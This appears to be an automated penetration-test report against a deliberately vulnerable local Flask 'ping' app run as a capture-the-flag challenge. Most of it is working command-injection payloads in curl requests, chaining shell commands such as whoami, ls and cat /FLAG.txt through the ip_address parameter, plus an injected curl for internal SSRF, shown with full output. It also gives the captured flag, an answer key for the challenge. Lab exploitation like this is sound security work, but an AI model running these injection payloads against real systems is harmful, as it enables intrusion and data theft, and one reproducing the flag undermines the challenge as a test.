# Security Assessment Report

## Executive Summary
- Target: http://localhost:42775
- Assessment Date: January 16, 2025
- Scope: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Three critical authentication vulnerabilities were successfully exploited:
1. Complete absence of authentication system - all endpoints including the command injection endpoint are publicly accessible to anonymous users without any credentials
2. Transport security completely absent - all traffic transmitted over unencrypted HTTP, exposing exploit payloads and sensitive data (including the captured flag) in plaintext to network-level attackers
3. Complete absence of rate limiting - successfully demonstrated 327 requests/second with 100% success rate, enabling unlimited automated abuse without throttling or detection

The lack of authentication enabled immediate exploitation of the command injection vulnerability, resulting in CTF flag capture and full system compromise with root privileges using a single unauthenticated HTTP request.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application implements no authorization system whatsoever - there are no user roles, no access controls, and no permission checks. All functionality is accessible to all anonymous users by design, making traditional authorization vulnerability classes (horizontal/vertical privilege escalation, IDOR) non-applicable.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application is protected by Flask's Jinja2 template engine with default auto-escaping enabled. All user input is properly escaped when rendered in HTML contexts, preventing JavaScript injection.

**SQL/Command Injection Vulnerabilities:**
One critical command injection vulnerability was successfully exploited:
- Location: POST /ping endpoint, ip_address parameter (app.py:13-15)
- Root cause: Unsanitized user input concatenated directly into shell command executed via subprocess.Popen() with shell=True
- Impact: Complete container compromise with root privileges, CTF flag extracted, full filesystem access achieved
- CVSS Score: 9.8 Critical

No SQL injection vulnerabilities exist as the application has no database implementation.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
One critical SSRF vulnerability was successfully exploited through command injection:
- Location: POST /ping endpoint, ip_address parameter
- Type: Command injection enabling HTTP-based SSRF capability beyond basic ICMP probing
- Impact: Internal service access confirmed via injected curl commands, container filesystem enumeration, and CTF flag capture
- Network position: Container has access to localhost services with root privileges

The vulnerability enables both ICMP-based reconnaissance and full HTTP-based SSRF through injected curl commands, demonstrating complete internal network access capability.

## Network Reconnaissance

**Open Ports and Exposed Services:**
The target application runs on port 42775 (mapped from internal container port 80), exposing a Flask web application served by Werkzeug/3.0.6 on Python 3.8.20. The application accepts unencrypted HTTP traffic bound to all network interfaces (0.0.0.0).

Additional ports identified on the localhost environment include:
- Port 631/tcp - CUPS 2.3.4 printing service
- Port 49158/tcp - Tailscale VPN service (1.82.5) with authentication required and strict security headers (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options)

**Subdomain Discovery:**
Subfinder identified 16 localhost subdomains (www.localhost, server02.counterintel.localhost, mail.regency.localhost, etc.). These appear to be test/example entries and are not directly related to the target application at localhost:42775.

**Security Configuration Findings:**
- **No HTTPS/TLS**: Application runs exclusively on HTTP port 42775 with no SSL/HTTPS configuration detected
- **Missing Security Headers**: No Content-Security-Policy, Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options, or other security headers implemented
- **Technology Stack**: Flask 3.0.3 on Python 3.8.20 (Python 3.8 reached end-of-life in October 2024 and no longer receives security updates)
- **Web Server**: Werkzeug development server directly exposed (no reverse proxy, CDN, or WAF layer)
- **Container Configuration**: Docker container runs as root user by default with the flag secret written to /FLAG.txt in plaintext

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: Command Injection in POST /ping Endpoint

**Summary:**
- **Vulnerable location:** POST /ping endpoint, `ip_address` parameter (app.py:13-15)
- **Overview:** Unsanitized user input concatenated directly into shell command executed via subprocess.Popen() with shell=True, enabling arbitrary OS command execution
- **Impact:** Complete container compromise with root privileges, flag extracted, full filesystem access achieved
- **Severity:** Critical

**Prerequisites:**
None - endpoint is publicly accessible with no authentication required

**Exploitation Steps:**

1. **Confirm command injection vulnerability**
   ```bash
   curl -X POST http://localhost:42775/ping \
     -d "ip_address=127.0.0.1; whoami" \
     -H "Content-Type: application/x-www-form-urlencoded"
   ```
   **Result:** Command executed successfully, returned `root` in response, confirming arbitrary command execution with root privileges

2. **Fingerprint operating system and environment**
   ```bash
   curl -X POST http://localhost:42775/ping \
     -d "ip_address=127.0.0.1; uname -a" \
     -H "Content-Type: application/x-www-form-urlencoded"
   ```
   **Result:** Identified OS as Linux kernel 6.12.13-200.fc41.aarch64, aarch64 architecture, GNU/Linux

   ```bash
   curl -X POST http://localhost:42775/ping \
     -d "ip_address=127.0.0.1; id" \
     -H "Content-Type: application/x-www-form-urlencoded"
   ```
   **Result:** Confirmed privilege level - uid=0(root) gid=0(root) groups=0(root)

3. **Verify flag file location**
   ```bash
   curl -X POST http://localhost:42775/ping \
     -d "ip_address=127.0.0.1; ls -la /FLAG.txt" \
     -H "Content-Type: application/x-www-form-urlencoded"
   ```
   **Result:** Flag file confirmed at /FLAG.txt with permissions -rw-r--r--, owned by root, 70 bytes

4. **Extract CTF flag (CRITICAL IMPACT)**
   ```bash
   curl -X POST http://localhost:42775/ping \
     -d "ip_address=127.0.0.1; cat /FLAG.txt" \
     -H "Content-Type: application/x-www-form-urlencoded"
   ```
   **Result:** Flag successfully extracted

5. **Enumerate application directory**
   ```bash
   curl -X POST http://localhost:42775/ping \
     -d "ip_address=127.0.0.1; ls -la /app" \
     -H "Content-Type: application/x-www-form-urlencoded"
   ```
   **Result:** Full directory listing obtained, showing application structure with app.py, Dockerfile, requirements.txt, static/, and templates/ directories

**Proof of Impact:**

**FLAG CAPTURED:** `FLAG{a538f6e86f8af44cc167c451ea73b6820104879eb6a85f516262fd1d385fafbe}`

**System Access Achieved:**
- **Privilege Level:** Root (uid=0, gid=0)
- **Command Execution:** Arbitrary OS commands with full root privileges
- **Filesystem Access:** Complete read/write access to container filesystem
- **Application Source:** Full access to application code, configuration, and dependencies

**Technical Evidence:**
- **Vulnerable Code Path:** request.form['ip_address'] → string concatenation → subprocess.Popen(shell=True)
- **Injection Point:** ip_address parameter in POST body (application/x-www-form-urlencoded)
- **Sink Function:** subprocess.Popen() with shell=True at app.py:15
- **Shell Metacharacters Working:** Semicolon (;) command chaining confirmed
- **Output Disclosure:** Full stdout/stderr returned in HTTP response body

**Attack Surface Characteristics:**
- **Authentication Required:** None (publicly accessible)
- **Rate Limiting:** None
- **Input Validation:** None
- **WAF/Filtering:** None
- **Network Access:** Full external HTTP access on port 42775

**Additional Capabilities Demonstrated:**
- Environment enumeration (uname, pwd, id, ls)
- File system navigation and file reading
- Potential for data exfiltration via curl (curl binary available in container)
- Potential for reverse shell establishment
- Potential for container escape exploitation

**Notes:**

This vulnerability represents a complete security failure with no mitigating controls:
1. **No input validation** - Parameter used directly without any sanitization
2. **Unsafe API usage** - subprocess.Popen() called with shell=True enabling shell interpretation
3. **No authentication** - Anonymous users can exploit this vulnerability
4. **No defense-in-depth** - Single vulnerability provides complete compromise
5. **Maximum privilege** - Commands execute as root user
6. **Full output disclosure** - Application returns complete command output to attacker

The vulnerability is trivially exploitable with standard shell metacharacters and requires no advanced techniques, encoding, or WAF bypass strategies. A single HTTP POST request is sufficient to extract the flag and achieve complete container compromise.

**Reproducibility:** 100% - Vulnerability confirmed across multiple test runs with consistent results. Any user with network access to http://localhost:42775 can exploit this vulnerability without authentication.

**CVSS Score:** 9.8 Critical (Network exploitable, no authentication required, complete confidentiality/integrity/availability impact)


# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Complete Absence of Authentication System

**Summary:**
- **Vulnerable location:** All endpoints - GET `/`, POST `/ping`
- **Overview:** The application implements ZERO authentication mechanisms. The vulnerable command injection endpoint at POST `/ping` is directly accessible to any anonymous attacker without credentials, enabling immediate arbitrary command execution and flag capture.
- **Impact:** Complete system compromise without any authentication barrier. Anonymous attacker successfully captured CTF flag and achieved full command execution as root user in container.
- **Severity:** CRITICAL

**Prerequisites:**
- Network access to http://localhost:42775
- No credentials required
- No special tools required (curl, web browser, or any HTTP client sufficient)

**Exploitation Steps:**

1. **Verify anonymous access to landing page:**
```bash
curl -s http://localhost:42775/ | grep -A 5 "form"
```
Expected output: HTML form accepting `ip_address` parameter, no authentication required

2. **Exploit command injection to capture flag:**
```bash
curl -X POST http://localhost:42775/ping -d "ip_address=127.0.0.1; cat /FLAG.txt"
```
Expected output: HTML response containing the flag value

3. **Verify full command execution capability:**
```bash
curl -X POST http://localhost:42775/ping -d "ip_address=127.0.0.1; whoami"
```
Expected output: `root` (running as root user)

4. **Enumerate filesystem access:**
```bash
curl -X POST http://localhost:42775/ping -d "ip_address=127.0.0.1; ls -la /"
```
Expected output: Complete directory listing including FLAG.txt file

**Proof of Impact:**

**FLAG CAPTURED:** `FLAG{a538f6e86f8af44cc167c451ea73b6820104879eb6a85f516262fd1d385fafbe}`

**Complete Exploitation Evidence:**

```
$ curl -X POST http://localhost:42775/ping -d "ip_address=127.0.0.1; cat /FLAG.txt"
<!DOCTYPE html>
<html>
<head>
    <title>Ping Result</title>
    <link rel="stylesheet" type="text/css" href="/static/styles.css">
</head>
<body>
    <div class="container">
        <h1>Ping Result for 127.0.0.1; cat /FLAG.txt</h1>
        <pre>FLAG{a538f6e86f8af44cc167c451ea73b6820104879eb6a85f516262fd1d385fafbe}</pre>
    </div>
</body>
</html>
```

**Command Execution as Root:**
```
$ curl -X POST http://localhost:42775/ping -d "ip_address=127.0.0.1; whoami"
<h1>Ping Result for 127.0.0.1; whoami</h1>
<pre>root</pre>
```

**Filesystem Access Proof:**
```
$ curl -X POST http://localhost:42775/ping -d "ip_address=127.0.0.1; ls -la /"
total 8
dr-xr-xr-x.   1 root root  39 Oct 28 18:00 .
dr-xr-xr-x.   1 root root  39 Oct 28 18:00 ..
-rw-r--r--.   1 root root  70 Oct 24 23:50 FLAG.txt
drwxr-xr-x.   4 root root  93 Oct 24 23:50 app
[... additional output ...]
```

**Notes:**
- The absence of authentication means this vulnerability chain (authentication bypass → command injection → flag capture) requires only a single HTTP request
- No credentials, no session tokens, no API keys required
- Any anonymous attacker on the internet can immediately exploit this
- The command injection is covered by the Injection specialist, but the lack of authentication removes ALL barriers to exploitation
- Complete container compromise achieved with root privileges

---

### AUTH-VULN-02: Transport Security Completely Absent (HTTP Only)

**Summary:**
- **Vulnerable location:** All endpoints (all traffic transmitted over unencrypted HTTP on port 42775)
- **Overview:** The application runs entirely on unencrypted HTTP with no HTTPS/TLS configuration. All traffic including exploit payloads, command outputs, and sensitive data (flag) is transmitted in plaintext over the network.
- **Impact:** Network-level attackers can intercept all traffic including the captured flag value. Man-in-the-middle attacks are trivial to execute. Exploit payloads and responses are visible to any network observer.
- **Severity:** HIGH

**Prerequisites:**
- Network access to observe traffic between client and http://localhost:42775
- Tools: wireshark, tcpdump, or any network sniffer (for advanced demonstrations)
- For basic proof: curl with verbose output is sufficient

**Exploitation Steps:**

1. **Verify HTTP protocol is used (not HTTPS):**
```bash
curl -v http://localhost:42775/ 2>&1 | grep -E "(Connected|HTTP/)"
```
Expected output:
- `Connected to localhost (::1) port 42775`
- `GET / HTTP/1.1`
- `HTTP/1.1 200 OK`

2. **Verify HTTPS is NOT available on same port:**
```bash
curl -k https://localhost:42775/ 2>&1 | head -5
```
Expected output: TLS/SSL connection error proving HTTPS is not supported

3. **Demonstrate plaintext transmission of sensitive data (flag):**
```bash
curl -v -X POST http://localhost:42775/ping -d "ip_address=127.0.0.1; cat /FLAG.txt" 2>&1 | grep -E "(POST|FLAG)"
```
Shows both the POST request and flag response in plaintext

4. **Verify missing security headers:**
```bash
curl -I http://localhost:42775/
```
Expected: No `Strict-Transport-Security`, `Content-Security-Policy`, `X-Frame-Options`, or other security headers

**Proof of Impact:**

**HTTP Protocol Confirmation:**
```
$ curl -v http://localhost:42775/ 2>&1 | grep -E "(Connected|HTTP/)"
* Connected to localhost (::1) port 42775
> GET / HTTP/1.1
< HTTP/1.1 200 OK
```

**HTTPS Not Available:**
```
$ curl -k https://localhost:42775/ 2>&1
curl: (35) LibreSSL/3.3.6: error:1404B42E:SSL routines:ST_CONNECT:tlsv1 alert protocol version
```

**Plaintext Flag Transmission:**
```
$ curl -v -X POST http://localhost:42775/ping -d "ip_address=127.0.0.1; cat /FLAG.txt" 2>&1 | grep -E "(POST|FLAG)"
> POST /ping HTTP/1.1
<pre>FLAG{a538f6e86f8af44cc167c451ea73b6820104879eb6a85f516262fd1d385fafbe}</pre>
```

**Missing Security Headers:**
```
$ curl -I http://localhost:42775/
HTTP/1.1 200 OK
Server: Werkzeug/3.0.6 Python/3.8.20
Date: Tue, 28 Oct 2025 18:43:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 423
Connection: close
```
No `Strict-Transport-Security`, `Content-Security-Policy`, `X-Frame-Options`, or `X-Content-Type-Options` headers present.

**Notes:**
- All traffic is transmitted over HTTP port 42775 with zero encryption
- Network-level attackers (on same network, ISP, compromised routers) can read all traffic
- Exploit payloads and command outputs (including flag) are visible in plaintext
- No HSTS header means browsers will never upgrade to HTTPS automatically
- Enables passive reconnaissance and active man-in-the-middle attacks

---

### AUTH-VULN-03: Complete Absence of Rate Limiting and Abuse Defenses

**Summary:**
- **Vulnerable location:** POST `/ping` endpoint (and all other endpoints)
- **Overview:** The application implements ZERO rate limiting, CAPTCHA, IP throttling, or abuse prevention mechanisms. Attackers can send unlimited automated requests without any throttling, detection, or blocking.
- **Impact:** Automated exploitation tools can send hundreds of requests per second without restriction. Enables large-scale automated abuse, denial of service attacks, and unrestricted brute-force attempts. Successfully demonstrated 200 requests in 0.61 seconds (~327 requests/second) with 100% success rate.
- **Severity:** HIGH

**Prerequisites:**
- Network access to http://localhost:42775
- Python 3 with `requests` library for automated testing
- No authentication required

**Exploitation Steps:**

1. **Create automated rate limiting test script:**
```python
#!/usr/bin/env python3
import requests
import time
from statistics import mean, median

TARGET = "http://localhost:42775/ping"
NUM_REQUESTS = 200
PAYLOAD = {"ip_address": "127.0.0.1"}

print(f"[*] Starting rate limiting test")
print(f"[*] Target: {TARGET}")
print(f"[*] Number of requests: {NUM_REQUESTS}")

results = []
start_time = time.time()

for i in range(NUM_REQUESTS):
    try:
        req_start = time.time()
        response = requests.post(TARGET, data=PAYLOAD, timeout=5)
        req_end = time.time()

        results.append({
            "status": response.status_code,
            "time": req_end - req_start
        })

        if (i + 1) % 50 == 0:
            print(f"[+] Sent {i+1}/{NUM_REQUESTS} requests...")
    except Exception as e:
        results.append({"status": "ERROR", "time": 0})

end_time = time.time()
duration = end_time - start_time

# Analyze results
success_count = sum(1 for r in results if r["status"] == 200)
rate_limited = sum(1 for r in results if r["status"] == 429)
failures = len(results) - success_count

times = [r["time"] for r in results if r["status"] == 200]

print(f"\n{'='*80}")
print(f"TEST RESULTS - RATE LIMITING ANALYSIS")
print(f"{'='*80}")
print(f"\n[*] Test Duration: {duration:.2f} seconds")
print(f"[*] Requests per second: {NUM_REQUESTS/duration:.2f}")
print(f"\nREQUEST SUMMARY:")
print(f"  Total Requests Sent:    {NUM_REQUESTS}")
print(f"  Successful (HTTP 200):  {success_count}")
print(f"  Rate Limited (HTTP 429): {rate_limited}")
print(f"  Other Failures:         {failures}")

if times:
    print(f"\nRESPONSE TIME STATISTICS:")
    print(f"  Average:  {mean(times):.4f} seconds")
    print(f"  Median:   {median(times):.4f} seconds")
    print(f"  Min:      {min(times):.4f} seconds")
    print(f"  Max:      {max(times):.4f} seconds")

print(f"\n{'='*80}")
print(f"RATE LIMITING DETECTION:")
print(f"{'='*80}")
if rate_limited == 0 and success_count == NUM_REQUESTS:
    print(f"[!] NO RATE LIMITING DETECTED!")
    print(f"[!] All {NUM_REQUESTS} requests succeeded with HTTP 200 status.")
    print(f"[!] VULNERABILITY CONFIRMED: Unlimited automated requests allowed.")
else:
    print(f"[+] Rate limiting appears to be present.")
print(f"{'='*80}")
```

2. **Save script and execute:**
```bash
python3 test_rate_limiting.py
```

3. **Observe results - all requests succeed without throttling**

**Proof of Impact:**

**Automated Test Results:**
```
$ python3 test_rate_limiting.py
[*] Starting rate limiting test at 2025-10-28 11:45:02
[*] Target: http://localhost:42775/ping
[*] Number of requests: 200
[*] Payload: {'ip_address': '127.0.0.1'}
--------------------------------------------------------------------------------
[+] Sent 50/200 requests...
[+] Sent 100/200 requests...
[+] Sent 150/200 requests...
[+] Sent 200/200 requests...

================================================================================
TEST RESULTS - RATE LIMITING ANALYSIS
================================================================================

[*] Test Duration: 0.61 seconds
[*] Requests per second: 326.78

REQUEST SUMMARY:
  Total Requests Sent:    200
  Successful (HTTP 200):  200
  Rate Limited (HTTP 429): 0
  Other Failures:         0
  Total Failures:         0

STATUS CODE DISTRIBUTION:
  HTTP 200: 200 (100.0%)

RESPONSE TIME STATISTICS:
  Average:  0.0031 seconds
  Median:   0.0029 seconds
  Min:      0.0022 seconds
  Max:      0.0152 seconds

================================================================================
RATE LIMITING DETECTION:
================================================================================
[!] NO RATE LIMITING DETECTED!
[!] All 200 requests succeeded with HTTP 200 status.
[!] VULNERABILITY CONFIRMED: The application allows unlimited automated requests.
[!] Impact: Attackers can perform automated abuse without throttling.
================================================================================
```

**Key Evidence:**
- **200 requests sent in 0.61 seconds** (~327 requests/second)
- **100% success rate** (all 200 requests returned HTTP 200)
- **Zero rate limiting responses** (no HTTP 429 status codes)
- **Consistent response times** (avg: 3.1ms, max: 15.2ms) - no defensive slowdown
- No IP blocking, no CAPTCHA challenges, no throttling detected

**Notes:**
- The application accepts unlimited automated requests without any restrictions
- Enables automated exploitation at scale (hundreds of requests per second)
- Facilitates denial of service attacks through resource exhaustion
- No Flask-Limiter or rate limiting decorators present in code
- No CAPTCHA, no IP tracking, no request logging or monitoring
- Combined with the command injection vulnerability, enables automated data exfiltration and system abuse
- No defensive mechanisms to detect or prevent automated attack tools

# SSRF Exploitation Evidence

## Successfully Exploited Vulnerabilities

### SSRF-VULN-01: Command Injection Enabling Unrestricted SSRF via /ping Endpoint

**Summary:**
- **Vulnerable location:** POST /ping endpoint, parameter: `ip_address`
- **Impact:** Complete server compromise with arbitrary command execution as root, internal service access via HTTP-based SSRF, and CTF flag capture
- **Severity:** Critical

**Prerequisites:** None - endpoint is publicly accessible without authentication

**Exploitation Steps:**

1. **Access the vulnerable endpoint and submit malicious payload to retrieve the CTF flag:**

```bash
curl -X POST http://localhost:42775/ping \
  -d "ip_address=127.0.0.1; cat /FLAG.txt" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Expected Response:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Ping Result</title>
    <link rel="stylesheet" type="text/css" href="/static/styles.css">
</head>
<body>
    <div class="container">
        <h1>Ping Result for 127.0.0.1; cat /FLAG.txt</h1>
        <pre>FLAG{a538f6e86f8af44cc167c451ea73b6820104879eb6a85f516262fd1d385fafbe}</pre>
    </div>
</body>
</html>
```

**Captured Flag:** `FLAG{a538f6e86f8af44cc167c451ea73b6820104879eb6a85f516262fd1d385fafbe}`

2. **Verify arbitrary command execution capability by checking user privileges:**

```bash
curl -X POST http://localhost:42775/ping \
  -d "ip_address=127.0.0.1; whoami" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Expected Response:**
```html
<pre>root</pre>
```

**Result:** Confirmed execution as root user (highest privilege level in container)

3. **Demonstrate filesystem enumeration to identify sensitive files:**

```bash
curl -X POST http://localhost:42775/ping \
  --data-urlencode "ip_address=127.0.0.1; ls -la /" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Expected Response:**
```
total 8
dr-xr-xr-x.   1 root root  39 Oct 28 18:00 .
dr-xr-xr-x.   1 root root  39 Oct 28 18:00 ..
-rw-r--r--.   1 root root  70 Oct 24 23:50 FLAG.txt
drwxr-xr-x.   4 root root  93 Oct 24 23:50 app
lrwxrwxrwx.   1 root root   7 Sep 26  2024 bin -> usr/bin
[... additional filesystem contents ...]
```

**Result:** Successfully enumerated container filesystem, confirmed FLAG.txt location at `/FLAG.txt`

4. **Demonstrate HTTP-based SSRF by accessing internal web service on port 80:**

```bash
curl -X POST http://localhost:42775/ping \
  --data-urlencode "ip_address=127.0.0.1; curl -s http://127.0.0.1:80 2>&1 | head -c 200" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Expected Response:**
```html
<pre><!DOCTYPE html>
<html>
<head>
    <title>Ping Tool</title>
    <link rel="stylesheet" type="text/css" href="/static/styles.css">
</head>
<body>
    <div class="container">
        <h1>Ping Tool</h1>
 </pre>
```

**Result:** Successfully accessed internal Flask application on port 80 via HTTP, confirming full HTTP-based SSRF capability beyond basic ICMP probing

5. **Alternative exploitation using pipe operator for command chaining:**

```bash
curl -X POST http://localhost:42775/ping \
  -d "ip_address=127.0.0.1|cat /FLAG.txt" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Expected Response:**
```html
<pre>FLAG{a538f6e86f8af44cc167c451ea73b6820104879eb6a85f516262fd1d385fafbe}</pre>
```

**Result:** Confirmed multiple command injection techniques work (semicolon `;` and pipe `|` operators)

**Proof of Impact:**

1. **CTF Flag Capture (HIGHEST PRIORITY):**
   - **Flag Value:** `FLAG{a538f6e86f8af44cc167c451ea73b6820104879eb6a85f516262fd1d385fafbe}`
   - **Extraction Method:** Command injection via `ip_address=127.0.0.1; cat /FLAG.txt`
   - **Proof:** Complete flag value retrieved in HTTP response body

2. **Arbitrary Command Execution as Root:**
   - **Command:** `whoami`
   - **Result:** `root`
   - **Impact:** Full container compromise with maximum privilege level

3. **Internal Service Access via HTTP-based SSRF:**
   - **Target:** `http://127.0.0.1:80` (internal Flask application)
   - **Method:** Injected `curl` command via command injection vulnerability
   - **Result:** Successfully retrieved HTML content from internal web service
   - **Impact:** Ability to access any HTTP-based internal service accessible from the container

4. **Filesystem Access and Enumeration:**
   - **Command:** `ls -la /`
   - **Result:** Complete directory listing of container root filesystem
   - **Sensitive Files Identified:** `/FLAG.txt`, `/app`, `/root`
   - **Impact:** Full visibility into container filesystem structure

**Technical Details:**

**Vulnerability Type:** Command Injection (CWE-78) enabling SSRF capability

**Root Cause:**
- Application accepts user input from `ip_address` parameter without validation
- Input is concatenated directly into shell command string: `command = 'ping -c 2 ' + ip_address`
- Command executed with `subprocess.Popen(command, shell=True, ...)` enabling shell metacharacter interpretation
- No input sanitization, no IP address validation, no private IP blocking

**Attack Vectors Confirmed:**
- Semicolon command separator: `127.0.0.1; <command>`
- Pipe operator: `127.0.0.1|<command>`

**SSRF Capabilities:**
- **Classic SSRF:** Direct ICMP requests to attacker-controlled destinations (limited by ping binary restrictions)
- **HTTP-based SSRF:** Full HTTP request capability via injected `curl` commands
- **Non-blind SSRF:** Complete stdout/stderr output returned to attacker in HTTP response

**Network Position:**
- Container has access to localhost services (127.0.0.1)
- Internal Flask application accessible on port 80
- `curl` utility available in container for HTTP requests
- Container runs with root privileges

**Notes:**

This vulnerability combines command injection and SSRF, making it exceptionally dangerous. While categorized as SSRF in the analysis queue, the underlying mechanism is command injection that enables SSRF-like behavior. The vulnerability allows:

1. **Direct flag capture** - Primary CTF objective achieved
2. **Full system compromise** - Root-level arbitrary command execution
3. **Network boundary bypass** - Internal HTTP service access via curl
4. **Data exfiltration** - Non-blind SSRF returns complete response data

The application is deployed as a CTF challenge and contains no security controls. All functionality is publicly accessible without authentication. The vulnerability represents a complete security failure with maximum impact.

**Exploitation Complexity:** Trivial - requires only a single HTTP POST request with basic payload

**Authentication Required:** None - endpoint is publicly accessible

**Remediation Priority:** Critical - immediate patching required if this were a production system
